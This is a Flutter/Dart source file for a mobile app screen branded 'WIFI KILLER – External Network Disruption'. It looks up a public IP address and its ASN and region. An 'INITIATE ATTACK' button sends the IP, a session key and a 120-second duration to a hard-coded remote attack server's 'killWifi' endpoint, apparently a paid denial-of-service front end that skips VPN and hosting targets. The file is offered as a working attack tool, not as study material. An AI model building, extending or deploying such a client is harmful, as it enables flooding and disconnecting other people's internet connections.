import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> with TickerProviderStateMixin {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  late AnimationController _pulseController;
  late AnimationController _glowController;
  late AnimationController _scanController;
  late Animation<double> _pulseAnimation;
  late Animation<double> _glowAnimation;
  late Animation<double> _scanAnimation;

  final Color primaryDark = const Color(0xFF270A1A);
  final Color primaryPink = const Color(0xFF8A1E5A);
  final Color accentPink = const Color(0xFFF63B82);
  final Color lightPink = const Color(0xFFFA60A5);
  final Color primaryWhite = Colors.white;
  final Color accentGrey = Colors.grey.shade400;
  final Color cardDark = const Color(0xFF37152C);
  final Color glassColor = const Color(0x1FFFFFFF);

  @override
  void initState() {
    super.initState();
    _pulseController = AnimationController(
      duration: const Duration(seconds: 2),
      vsync: this,
    )..repeat(reverse: true);

    _glowController = AnimationController(
      duration: const Duration(seconds: 3),
      vsync: this,
    )..repeat(reverse: true);

    _scanController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    );

    _pulseAnimation = Tween<double>(begin: 0.8, end: 1.2).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut),
    );

    _glowAnimation = Tween<double>(begin: 0.5, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );

    _scanAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _scanController, curve: Curves.easeOut),
    );

    _loadPublicInfo();
    _scanController.forward();
  }

  @override
  void dispose() {
    _pulseController.dispose();
    _glowController.dispose();
    _scanController.dispose();
    super.dispose();
  }

  Future<void> _loadPublicInfo() async {
    setState(() {
      isLoading = true;
    });

    try {
      final ipRes = await http.get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(Uri.parse("http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    HapticFeedback.heavyImpact();
    setState(() => isAttacking = true);
    final url = Uri.parse(
        "http://152.53.249.119:2028/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("❌ Failed", "Server rejected the request.");
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message) {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: cardDark,
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: accentPink.withOpacity(0.3)),
            boxShadow: [
              BoxShadow(
                color: accentPink.withOpacity(0.3),
                blurRadius: 15,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Text(
                title,
                style: TextStyle(
                  color: lightPink,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Orbitron',
                ),
              ),
              const SizedBox(height: 16),
              Text(
                message,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 16,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 20),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryPink, accentPink],
                      begin: Alignment.centerLeft,
                      end: Alignment.centerRight,
                    ),
                    borderRadius: BorderRadius.circular(30),
                  ),
                  child: Text(
                    "OK",
                    style: TextStyle(
                      color: primaryWhite,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Orbitron',
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryDark,
      body: Stack(
        children: [
          _buildAnimatedBackground(),

          SafeArea(
            child: Column(
              children: [
                _buildNewHeader(),

                const SizedBox(height: 20),

                Expanded(
                  child: isLoading
                      ? _buildLoadingView()
                      : _buildMainContent(),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildAnimatedBackground() {
    return AnimatedBuilder(
      animation: _glowController,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                primaryDark,
                const Color(0xFF37152C),
                const Color(0xFF2A0F17),
              ],
            ),
          ),
          child: Stack(
            children: [
              ...List.generate(20, (index) {
                final top = (_glowController.value + index * 0.05) % 1.0;
                final left = (index * 0.1) % 1.0;
                final size = 5.0 + (index % 4) * 3.0;
                final opacity = 0.1 + (index % 3) * 0.1;

                return Positioned(
                  top: top * MediaQuery.of(context).size.height,
                  left: left * MediaQuery.of(context).size.width,
                  child: Container(
                    width: size,
                    height: size,
                    decoration: BoxDecoration(
                      color: lightPink.withOpacity(opacity),
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: lightPink.withOpacity(opacity * 0.5),
                          blurRadius: size,
                          spreadRadius: size / 2,
                        ),
                      ],
                    ),
                  ),
                );
              }),

              Positioned(
                top: -150,
                right: -150,
                child: AnimatedBuilder(
                  animation: _glowController,
                  builder: (context, child) {
                    return Transform.rotate(
                      angle: _glowController.value * 2 * 3.14159,
                      child: Container(
                        width: 400,
                        height: 400,
                        decoration: BoxDecoration(
                          shape: BoxShape.circle,
                          gradient: RadialGradient(
                            colors: [
                              accentPink.withOpacity(0.15 * _glowAnimation.value),
                              Colors.transparent,
                            ],
                          ),
                        ),
                      ),
                    );
                  },
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildNewHeader() {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
      decoration: BoxDecoration(
        color: glassColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: Colors.white.withOpacity(0.2),
          width: 1,
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.2),
            blurRadius: 10,
            offset: const Offset(0, 4),
          ),
        ],
      ),
      child: Row(
        children: [
          AnimatedBuilder(
            animation: _pulseAnimation,
            builder: (context, child) {
              return Transform.scale(
                scale: isAttacking ? _pulseAnimation.value : 1.0,
                child: Container(
                  width: 50,
                  height: 50,
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [primaryPink, accentPink],
                      begin: Alignment.topLeft,
                      end: Alignment.bottomRight,
                    ),
                    borderRadius: BorderRadius.circular(15),
                    boxShadow: [
                      BoxShadow(
                        color: accentPink.withOpacity(0.4),
                        blurRadius: 10,
                        offset: const Offset(0, 4),
                      ),
                    ],
                  ),
                  child: const Icon(
                    Icons.wifi_off,
                    color: Colors.white,
                    size: 30,
                  ),
                ),
              );
            },
          ),

          const SizedBox(width: 16),

          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "WIFI KILLER",
                  style: TextStyle(
                    color: primaryWhite,
                    fontSize: 20,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1.5,
                  ),
                ),
                Text(
                  "External Network Disruption",
                  style: TextStyle(
                    color: lightPink,
                    fontSize: 14,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ],
            ),
          ),

          Container(
            width: 12,
            height: 12,
            decoration: BoxDecoration(
              color: isAttacking ? Colors.redAccent : lightPink,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(
                  color: (isAttacking ? Colors.redAccent : lightPink).withOpacity(0.5),
                  blurRadius: 5,
                  spreadRadius: 1,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildLoadingView() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          AnimatedBuilder(
            animation: _scanAnimation,
            builder: (context, child) {
              return Stack(
                alignment: Alignment.center,
                children: [
                  Container(
                    width: 120,
                    height: 120,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentPink.withOpacity(0.3),
                        width: 2,
                      ),
                    ),
                  ),

                  Container(
                    width: 100,
                    height: 100,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentPink.withOpacity(0.5),
                        width: 2,
                      ),
                    ),
                  ),

                  Container(
                    width: 80,
                    height: 80,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      border: Border.all(
                        color: accentPink.withOpacity(0.7),
                        width: 2,
                      ),
                    ),
                  ),

                  Transform.rotate(
                    angle: _scanAnimation.value * 2 * 3.14159,
                    child: Container(
                      width: 120,
                      height: 2,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          colors: [
                            Colors.transparent,
                            lightPink,
                            Colors.transparent,
                          ],
                        ),
                      ),
                    ),
                  ),

                  Icon(
                    Icons.wifi,
                    color: lightPink,
                    size: 40,
                  ),
                ],
              );
            },
          ),

          const SizedBox(height: 24),

          Text(
            "Scanning Network...",
            style: TextStyle(
              color: lightPink,
              fontSize: 18,
              fontFamily: 'Orbitron',
              fontWeight: FontWeight.bold,
            ),
          ),

          const SizedBox(height: 8),

          Text(
            "Analyzing target information",
            style: TextStyle(
              color: accentGrey,
              fontSize: 14,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMainContent() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: glassColor,
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: Colors.white.withOpacity(0.2),
                width: 1,
              ),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.2),
                  blurRadius: 10,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.control_point_sharp, color: lightPink),
                    const SizedBox(width: 8),
                    Text(
                      "TARGET INFORMATION",
                      style: TextStyle(
                        color: primaryWhite,
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Orbitron',
                      ),
                    ),
                  ],
                ),

                const SizedBox(height: 16),

                _buildInfoRow("IP Address", publicIp, Icons.language),

                const SizedBox(height: 12),

                _buildInfoRow("Region", region, Icons.map),

                const SizedBox(height: 12),

                _buildInfoRow("ASN", asn, Icons.storage),

                const SizedBox(height: 12),

                _buildInfoRow(
                  "VPN Status",
                  isVpn ? "DETECTED" : "CLEAN",
                  isVpn ? Icons.warning : Icons.check_circle,
                  isVpn ? Colors.redAccent : Colors.greenAccent,
                ),
              ],
            ),
          ),

          const SizedBox(height: 20),

          if (isVpn)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.red.withOpacity(0.2),
                borderRadius: BorderRadius.circular(15),
                border: Border.all(
                  color: Colors.red.withOpacity(0.5),
                  width: 1,
                ),
              ),
              child: Row(
                children: [
                  Icon(Icons.warning, color: Colors.redAccent),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Text(
                      "Target detected as VPN/Hosting. Attack blocked for security reasons.",
                      style: TextStyle(
                        color: Colors.redAccent,
                        fontSize: 14,
                      ),
                    ),
                  ),
                ],
              ),
            ),

          const SizedBox(height: 20),

          if (!isVpn)
            GestureDetector(
              onTap: isAttacking ? null : _attackTarget,
              child: AnimatedContainer(
                duration: const Duration(milliseconds: 300),
                width: double.infinity,
                height: 60,
                decoration: BoxDecoration(
                  gradient: isAttacking
                      ? LinearGradient(
                    colors: [Colors.grey.shade700, Colors.grey.shade800],
                    begin: Alignment.centerLeft,
                    end: Alignment.centerRight,
                  )
                      : LinearGradient(
                    colors: [primaryPink, accentPink],
                    begin: Alignment.centerLeft,
                    end: Alignment.centerRight,
                  ),
                  borderRadius: BorderRadius.circular(15),
                  boxShadow: [
                    BoxShadow(
                      color: isAttacking
                          ? Colors.transparent
                          : accentPink.withOpacity(0.4),
                      blurRadius: 10,
                      offset: const Offset(0, 4),
                    ),
                  ],
                ),
                child: Center(
                  child: isAttacking
                      ? Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      SizedBox(
                        width: 20,
                        height: 20,
                        child: CircularProgressIndicator(
                          color: primaryWhite,
                          strokeWidth: 2,
                        ),
                      ),
                      const SizedBox(width: 12),
                      Text(
                        "ATTACKING...",
                        style: TextStyle(
                          color: primaryWhite,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Orbitron',
                          fontSize: 16,
                        ),
                      ),
                    ],
                  )
                      : Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Icon(Icons.flash_on, color: primaryWhite),
                      const SizedBox(width: 12),
                      Text(
                        "INITIATE ATTACK",
                        style: TextStyle(
                          color: primaryWhite,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Orbitron',
                          fontSize: 16,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),

          const SizedBox(height: 20),

          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.3),
              borderRadius: BorderRadius.circular(15),
              border: Border.all(
                color: accentPink.withOpacity(0.2),
                width: 1,
              ),
            ),
            child: Row(
              children: [
                Icon(Icons.info_outline, color: lightPink),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    "Attack will run for 120 seconds. Use responsibly.",
                    style: TextStyle(
                      color: accentGrey,
                      fontSize: 14,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildInfoRow(String label, String value, IconData icon, [Color? iconColor]) {
    return Row(
      children: [
        Container(
          width: 40,
          height: 40,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.3),
            borderRadius: BorderRadius.circular(10),
            border: Border.all(
              color: accentPink.withOpacity(0.3),
              width: 1,
            ),
          ),
          child: Icon(
            icon,
            color: iconColor ?? lightPink,
            size: 20,
          ),
        ),

        const SizedBox(width: 12),

        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                label,
                style: TextStyle(
                  color: accentGrey,
                  fontSize: 12,
                ),
              ),
              Text(
                value,
                style: TextStyle(
                  color: primaryWhite,
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'ShareTechMono',
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }
}